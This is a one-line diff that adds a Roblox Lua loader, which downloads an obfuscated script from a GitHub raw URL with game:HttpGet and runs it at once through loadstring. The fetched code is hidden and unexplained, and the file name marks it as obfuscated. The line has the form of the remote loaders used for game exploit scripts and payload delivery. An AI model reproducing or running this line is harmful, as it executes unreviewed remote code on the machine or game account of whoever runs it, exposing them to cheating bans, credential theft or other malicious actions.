@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Godyulikkjos/goolisn0/main/obf_iv59yI506e9j5Vx44SXUtCC0V1TdwuDipkiHVh2OcN7ntzT8Y8j89cWv39yJ22k5.lua'))()
